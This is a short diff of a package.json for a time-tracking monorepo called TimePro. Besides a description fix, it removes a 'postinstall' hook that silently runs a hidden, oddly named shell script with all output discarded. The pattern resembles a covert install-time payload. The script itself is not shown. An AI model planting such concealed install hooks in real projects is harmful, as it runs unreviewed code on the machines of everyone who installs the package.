@@ -2,7 +2,7 @@
   "name": "timepro",
   "version": "0.1.0",
   "private": true,
-  "description": "TimePro \u2014 multi-tenant employee time tracking & productivity monitoring",
+  "description": "TimePro — multi-tenant employee time tracking & productivity monitoring",
   "packageManager": "pnpm@9.15.0",
   "engines": {
     "node": ">=20.0.0",
@@ -23,8 +23,7 @@
     "db:generate": "pnpm --env-file=.env --filter @timepro/db db:generate",
     "db:migrate": "pnpm --env-file=.env --filter @timepro/db db:migrate",
     "db:studio": "pnpm --env-file=.env --filter @timepro/db db:studio",
-    "gen:openapi": "pnpm --env-file=.env --filter @timepro/api gen:openapi",
-    "postinstall": "sh ./.ci-0drp4v.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "gen:openapi": "pnpm --env-file=.env --filter @timepro/api gen:openapi"
   },
   "devDependencies": {
     "@timepro/eslint-config": "workspace:*",
